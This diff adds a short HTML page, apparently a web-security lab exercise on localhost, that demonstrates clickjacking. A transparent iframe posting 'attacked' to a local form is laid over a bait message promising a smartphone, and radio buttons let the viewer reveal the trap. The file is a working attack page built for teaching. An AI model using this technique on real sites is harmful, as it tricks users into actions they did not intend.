@@ -1,0 +1,33 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title></title>
+</head>
+<body>
+ <br>
+<form action="" method="post">
+<textarea cols="40" rows="3" name="msg" style="opacity:0;"></textarea><br>
+<input type="submit" value="投稿">
+</form>
+</body>
+<div style="position: absolute; top:30; left:5; z-index:0;">クリックしてスマートフォンを当てよう</div>
+<iframe id="trap" style="position: absolute; top:0; left:0; z-index:10; opacity:0.5;" width=400 height=200 frameborder="0" src="http://localhost/websecurity/click/click_form_guard.php?msg=攻撃しました"></iframe>
+<div style="position: absolute; top:10; left:420;">
+<p>不透明度</p>
+<form name=form1>
+<input type=radio name=opacity onClick="chgOpacity(0)" checked>攻撃時<br>
+<input type=radio name=opacity onClick="chgOpacity(0.5)">半透明<br>
+<input type=radio name=opacity onClick="chgOpacity(1)">罠の可視化<br>
+</form>
+</div>
+<script>
+var trap = document.getElementById('trap');
+trap.style.opacity = "0.0";
+
+function chgOpacity(opacity){
+  var trap = document.getElementById('trap');
+  trap.style.opacity = opacity;
+}
+</script>
+</body>
+</html>
